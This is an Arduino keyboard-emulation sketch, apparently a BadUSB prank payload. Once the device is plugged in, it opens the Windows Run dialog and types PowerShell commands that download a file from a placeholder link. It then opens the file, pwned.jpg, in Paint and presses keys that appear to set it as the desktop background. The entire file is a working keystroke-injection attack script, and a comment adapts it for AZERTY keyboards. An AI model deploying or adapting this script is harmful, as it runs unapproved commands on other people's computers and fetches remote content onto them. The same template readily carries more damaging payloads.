#include <Keyboard.h>

// Press & release function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Windows Run function
void winR(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(250);
}

void setup()
{
  Keyboard.begin();

  // Start Payload
  delay(3000);
  
  winR();
  Keyboard.print("powershell.exe Invoke-WebRequest <INSERT LINK TO IMAGE FILE> -OutFile C:/Users/$env:Username/Downloads/");
  delay(250);
  typeKey(KEY_RETURN);
  delay(2000);
  
  winR();
  // If like me you are in an area using AZERTY layout, the code is : "pozershell<exe cd C.>Users>]env.Usernq;e>Doznloqds> , ;spqint pzned<jpg"
  // I have not figured how to insert backslashes "\" or how to properly remap the layout in the keyboard library
  Keyboard.print("powershell.exe cd C:/Users/$env:Username/Downloads/ ; mspaint pwned.jpg");
  typeKey(KEY_RETURN);
  delay(2000);

  typeKey(KEY_LEFT_ALT);
  typeKey(102);
  typeKey(98);

  // End Payload

  Keyboard.end();
}


void loop() {}
